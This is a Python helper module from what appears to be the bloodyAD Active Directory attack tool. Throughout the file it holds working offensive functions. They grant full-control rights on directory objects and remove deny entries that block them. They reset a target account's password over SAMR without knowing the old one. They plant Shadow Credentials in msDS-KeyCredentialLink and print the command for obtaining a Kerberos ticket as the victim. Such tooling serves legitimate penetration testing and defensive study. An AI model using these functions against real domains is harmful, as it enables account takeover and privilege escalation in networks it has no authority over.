import random
import string
import ldap3
import impacket
import logging
import json
import sys
from ldap3.protocol.formatters.formatters import format_sid
from bloodyAD.formatters import decodeAce
from impacket.ldap import ldaptypes
from impacket.dcerpc.v5 import samr, dtypes
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.common.data import DNWithBinary

from bloodyAD.exceptions import NoResultError, ResultError, TooManyResultsError
from bloodyAD.formatters import ACCESS_FLAGS, ACE_FLAGS

LOG = logging.getLogger("bloodyAD")
LOG.setLevel(logging.DEBUG)
handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.DEBUG)
LOG.addHandler(handler)


def createACE(sid, object_type=None, access_mask=ACCESS_FLAGS["FULL_CONTROL"]):
    nace = ldaptypes.ACE()
    nace["AceFlags"] = (
        ACE_FLAGS["CONTAINER_INHERIT_ACE"] + ACE_FLAGS["OBJECT_INHERIT_ACE"]
    )

    if object_type is None:
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        nace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    else:
        nace["AceType"] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
        acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
        acedata["ObjectType"] = impacket.uuid.string_to_bin(object_type)
        acedata["InheritedObjectType"] = b""
        acedata["Flags"] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT

    acedata["Mask"] = ldaptypes.ACCESS_MASK()
    acedata["Mask"]["Mask"] = access_mask

    if type(sid) is str:
        acedata["Sid"] = ldaptypes.LDAP_SID()
        acedata["Sid"].fromCanonical(sid)
    else:
        acedata["Sid"] = sid

    nace["Ace"] = acedata
    return nace


def createEmptySD():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ldaptypes.ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


def resolvDN(conn, identity, objtype=None):
    """
    Return the DN for the object based on the parameters identity
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
        objtype: None is default or GPO
    """

    if "dc=" in identity.lower():
        # identity is a DN, return as is
        # We do not try to validate it because it could be from another trusted domain
        return identity

    if "s-1-" in identity.lower():
        # We assume identity is an SID
        ldap_filter = f"(objectSid={identity})"

    elif "{" in identity:
        if objtype == "GPO":
            ldap_filter = f"(&(objectClass=groupPolicyContainer)(name={identity}))"
        else:
            # We assume identity is a GUID
            ldap_filter = f"(objectGUID={identity})"
    else:
        # By default, we assume identity is a sam account name
        ldap_filter = f"(sAMAccountName={identity})"

    naming_context = getDefaultNamingContext(conn)
    conn.search(naming_context, ldap_filter)

    entries = [e for e in conn.response if e.get("type", "") == "searchResEntry"]

    if len(entries) < 1:
        raise NoResultError(naming_context, ldap_filter)

    if len(entries) > 1:
        raise TooManyResultsError(naming_context, ldap_filter, entries)

    res = entries[0]["dn"]
    return res


def search(
    conn,
    base,
    ldap_filter="(objectClass=*)",
    search_scope=ldap3.BASE,
    attr=["*"],
    control_flag=dtypes.OWNER_SECURITY_INFORMATION,
):
    ldap_conn = conn.getLdapConnection()
    base_dn = resolvDN(ldap_conn, base)
    controls = ldap3.protocol.microsoft.security_descriptor_control(
        sdflags=control_flag
    )
    ldap_conn.search(
        base_dn,
        ldap_filter,
        search_scope=search_scope,
        attributes=attr,
        controls=controls,
    )
    if len(ldap_conn.entries) < 1:
        raise NoResultError(base_dn, ldap_filter)
    return ldap_conn.response


def setAttr(
    conn,
    identity,
    attribute,
    value,
    control_flag=dtypes.OWNER_SECURITY_INFORMATION,
):
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    controls = ldap3.protocol.microsoft.security_descriptor_control(
        sdflags=control_flag
    )
    ldap_conn.modify(dn, {attribute: [ldap3.MODIFY_REPLACE, value]}, controls)

    if ldap_conn.result["result"] == 0:
        LOG.debug(f"[+] {attribute} set successfully")
    else:
        raise ResultError(conn.result)


def getDefaultNamingContext(conn):
    naming_context = conn.server.info.other["defaultNamingContext"][0]
    return naming_context


def getObjectSID(conn, identity):
    """
    Get the SID for the given identity
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object
    """
    ldap_conn = conn.getLdapConnection()
    object_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(
        object_dn,
        "(objectClass=*)",
        search_scope=ldap3.BASE,
        attributes="objectSid",
    )
    object_sid = ldap_conn.response[0]["raw_attributes"]["objectSid"][0]
    LOG.debug(f"[*] {identity} SID is: {format_sid(object_sid)}")
    return object_sid


def cryptPassword(session_key, password):
    try:
        from Cryptodome.Cipher import ARC4
    except Exception:
        LOG.error(
            "Warning: You don't have any crypto installed. You need pycryptodomex"
        )
        LOG.error("See https://pypi.org/project/pycryptodomex/")

    sam_user_pass = samr.SAMPR_USER_PASSWORD()
    encoded_pass = password.encode("utf-16le")
    plen = len(encoded_pass)
    sam_user_pass["Buffer"] = b"A" * (512 - plen) + encoded_pass
    sam_user_pass["Length"] = plen
    pwdBuff = sam_user_pass.getData()

    rc4 = ARC4.new(session_key)
    encBuf = rc4.encrypt(pwdBuff)

    sam_user_pass_enc = samr.SAMPR_ENCRYPTED_USER_PASSWORD()
    sam_user_pass_enc["Buffer"] = encBuf
    return sam_user_pass_enc


def rpcChangePassword(conn, target, new_pass):
    """
    Change the target password without knowing the old one using RPC instead of LDAPS
    Args:
        domain for NTLM authentication
        NTLM username of the user with permissions on the target
        NTLM password or hash of the user
        IP or hostname of the DC to make the password change
        sAMAccountName of the target
        new password for the target
    """
    dce = conn.getSamrConnection()
    server_handle = samr.hSamrConnect(dce, conn.conf.host + "\x00")["ServerHandle"]
    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, conn.conf.domain)[
        "DomainId"
    ]
    domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)[
        "DomainHandle"
    ]
    userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (target,))[
        "RelativeIds"
    ]["Element"][0]
    opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

    req = samr.SamrSetInformationUser2()
    req["UserHandle"] = opened_user["UserHandle"]
    req["UserInformationClass"] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req["Buffer"] = samr.SAMPR_USER_INFO_BUFFER()
    req["Buffer"]["tag"] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req["Buffer"]["Internal5"]["UserPassword"] = cryptPassword(
        b"SystemLibraryDTC", new_pass
    )
    req["Buffer"]["Internal5"]["PasswordExpired"] = 0

    resp = dce.request(req)
    return resp


def getSD(
    conn,
    object_id,
    ldap_attribute="nTSecurityDescriptor",
    control_flag=dtypes.DACL_SECURITY_INFORMATION,
):
    entry = search(conn, object_id, attr=ldap_attribute, control_flag=control_flag)[0]
    sd_data = entry["raw_attributes"][ldap_attribute]
    if len(sd_data) < 1:
        LOG.warning(
            "[!] No security descriptor has been returned, a new one will be created"
        )
        sd = createEmptySD()
    else:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])

    return sd, sd_data


def addRight(sd, user_sid, access_mask=ACCESS_FLAGS["FULL_CONTROL"], object_type=None):
    user_aces = [
        ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
    ]
    new_ace = createACE(user_sid, object_type, access_mask)
    if object_type:
        access_denied_type = ldaptypes.ACCESS_DENIED_OBJECT_ACE.ACE_TYPE
    else:
        access_denied_type = ldaptypes.ACCESS_DENIED_ACE.ACE_TYPE
    hasPriv = False

    for ace in user_aces:
        new_mask = new_ace["Ace"]["Mask"]
        mask = ace["Ace"]["Mask"]

        # Removes Access-Denied ACEs interfering
        if ace["AceType"] == access_denied_type and new_mask.hasPriv(mask["Mask"]):
            sd["Dacl"].aces.remove(ace)
            LOG.debug("[-] An interfering Access-Denied ACE has been removed:")
            LOG.info(json.dumps(decodeAce(ace)))
        # Adds ACE if not already added
        elif mask.hasPriv(new_mask["Mask"]):
            hasPriv = True
            break

    if hasPriv:
        LOG.debug("[!] This right already exists")
    else:
        sd["Dacl"].aces.append(new_ace)

    isAdded = not hasPriv
    return isAdded


def delRight(sd, user_sid, access_mask=ACCESS_FLAGS["FULL_CONTROL"], object_type=None):
    isRemoved = False
    user_aces = [
        ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
    ]
    if object_type:
        access_allowed_type = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    else:
        access_allowed_type = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE

    for ace in user_aces:
        mask = ace["Ace"]["Mask"]
        if ace["AceType"] == access_allowed_type and mask.hasPriv(access_mask):
            mask.removePriv(access_mask)
            LOG.debug("[-] Privilege Removed")
            if mask["Mask"] == 0:
                sd["Dacl"].aces.remove(ace)
            isRemoved = True

    if not isRemoved:
        LOG.debug("[!] No right to remove")
    return isRemoved


def addShadowCredentials(conn, identity, outfilePath=None):
    """
    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        outfilePath: file path for the generated certificate (default is current path)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    LOG.debug("Generating certificate")
    certificate = X509Certificate2(
        subject=identity,
        keySize=2048,
        notBefore=(-40 * 365),
        notAfter=(40 * 365),
    )
    LOG.debug("Certificate generated")
    LOG.debug("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(
        certificate=certificate,
        deviceId=Guid(),
        owner=target_dn,
        currentTime=DateTime(),
    )
    LOG.debug(
        "KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD()
    )
    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())

    ldap_conn.search(
        target_dn,
        "(objectClass=*)",
        search_scope=ldap3.BASE,
        attributes=["msDS-KeyCredentialLink"],
    )

    new_values = ldap_conn.response[0]["raw_attributes"]["msDS-KeyCredentialLink"] + [
        keyCredential.toDNWithBinary().toString()
    ]
    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
    ldap_conn.modify(
        target_dn,
        {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, new_values]},
    )

    if ldap_conn.result["result"] == 0:
        LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
        if outfilePath is None:
            path = "".join(
                random.choice(string.ascii_letters + string.digits) for i in range(8)
            )
            LOG.info(
                "No outfile path was provided. The certificate(s) will be"
                " stored with the filename: %s" % path
            )
        else:
            path = outfilePath

        certificate.ExportPEM(path_to_files=path)
        LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
        LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
        LOG.info(
            "A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools"
        )
        LOG.info("Run the following command to obtain a TGT:")
        LOG.info(
            "python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem"
            " -key-pem %s_priv.pem %s/%s %s.ccache"
            % (path, path, conn.conf.domain, identity, path)
        )

    else:
        raise ResultError(ldap_conn.result)


def delShadowCredentials(conn, identity, deviceID):
    """
    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
    """
    attr = "msDS-KeyCredentialLink"
    keyCreds = search(conn, identity, attr=attr)[0]["raw_attributes"][attr]
    newKeyCreds = []
    for keyCred in keyCreds:
        dnBin = DNWithBinary.DNWithBinary.fromRawDNWithBinary(keyCred)
        if (
            deviceID
            and KeyCredential.fromDNWithBinary(dnBin).DeviceId.toFormatD() != deviceID
        ):
            newKeyCreds.append(keyCred)
        else:
            LOG.debug("[*] Key to delete found")

    setAttr(conn, identity, attr, newKeyCreds)
